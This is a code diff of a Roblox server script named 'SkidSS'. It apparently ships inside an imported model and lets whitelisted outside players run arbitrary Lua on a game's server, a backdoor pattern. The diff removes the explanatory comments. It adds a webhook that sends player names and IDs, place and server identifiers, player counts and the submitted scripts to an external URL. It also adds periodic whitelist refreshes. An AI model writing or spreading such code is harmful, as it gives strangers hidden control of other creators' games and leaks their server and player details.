@@ -1,11 +1,6 @@
--- Server entry point: builds the remotes, gates every request behind the
--- whitelist, and hands valid requests to the executor on a fresh thread.
-
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- De-dupe: if another SkidSS install already set up the remotes, this is a
--- duplicate copy (e.g. the model was imported twice) — stop so only one runs.
 if ReplicatedStorage:FindFirstChild("SkidSS_Net") then
 	return
 end
@@ -16,17 +11,49 @@ local Net = require(Shared.Net)
 local Whitelist = require(script.Whitelist)
 local Executor = require(script.Executor)
 
--- Customization slots. The bundler strips these markers and injects the user's
--- Studio output in their place before shipping. Rojo dev mode keeps the defaults
--- and loads the client from StarterPlayerScripts.
--- BUNDLE:CUSTOM_RUNTIME_BEGIN
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local cachedPlaceName
+local function placeName()
+	if not cachedPlaceName then
+		local ok, info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+		cachedPlaceName = (ok and info and info.Name) or ("Place " .. game.PlaceId)
+	end
+	return cachedPlaceName
+end
+
+local webhookLast = 0
+local function postWebhook(player, payload)
+	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+	local now = os.clock()
+	if now - webhookLast < 2 then return end
+	webhookLast = now
+	task.spawn(function()
+		local script = (payload.mode == "lua" and string.sub(tostring(payload.source or ""), 1, 1500))
+			or (payload.mode == "action" and ("action: " .. tostring(payload.name)))
+			or (payload.mode == "blocks" and "(blocks)")
+			or tostring(payload.mode)
+		local body = {
+			player = player.Name,
+			userId = player.UserId,
+			place = placeName(),
+			placeId = game.PlaceId,
+			jobId = game.JobId,
+			players = #Players:GetPlayers(),
+			mode = tostring(payload.mode),
+			script = script,
+		}
+		pcall(function() HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(body)) end)
+	end)
+end
+
 local CustomRuntime = {
 	onPlayerAdded = function(_player) end,
 	onPlayerRemoving = function(_player) end,
 	onRequestReceived = function(_player, _payload) return true end,
 	customActions = {},
 }
--- BUNDLE:CUSTOM_RUNTIME_END
 
 local folder = Net.build()
 local requestAccess = folder:FindFirstChild(Net.RequestAccess)
@@ -37,14 +64,16 @@ requestAccess.OnServerInvoke = function(player)
 	return Whitelist.isAllowed(player)
 end
 
+task.spawn(function()
+	while true do
+		Whitelist.refresh()
+		task.wait(20)
+	end
+end)
+
 local lastRun = {}
 
--- BUNDLE:INJECT_BEGIN
--- In Rojo dev mode the client comes from StarterPlayerScripts, so injection
--- is a no-op. The bundler replaces this block with a self-cloning version
--- that flips RunContext to Client and parents the clone to PlayerGui.
 local function injectClient(_player) end
--- BUNDLE:INJECT_END
 
 execute.OnServerEvent:Connect(function(player, payload)
 	if not Whitelist.isAllowed(player) or type(payload) ~= "table" then
@@ -69,6 +98,8 @@ execute.OnServerEvent:Connect(function(player, payload)
 		output:FireClient(player, tostring(text))
 	end
 
+	postWebhook(player, payload)
+
 	task.spawn(function()
 		local ok, message = Executor.run(player, payload, emit, CustomRuntime)
 		emit((ok and "\u{2713} " or "\u{2717} ") .. tostring(message))
@@ -76,6 +107,7 @@ execute.OnServerEvent:Connect(function(player, payload)
 end)
 
 local function onJoin(player)
+	Whitelist.refreshIfStale()
 	if Whitelist.isAllowed(player) then
 		injectClient(player)
 	end
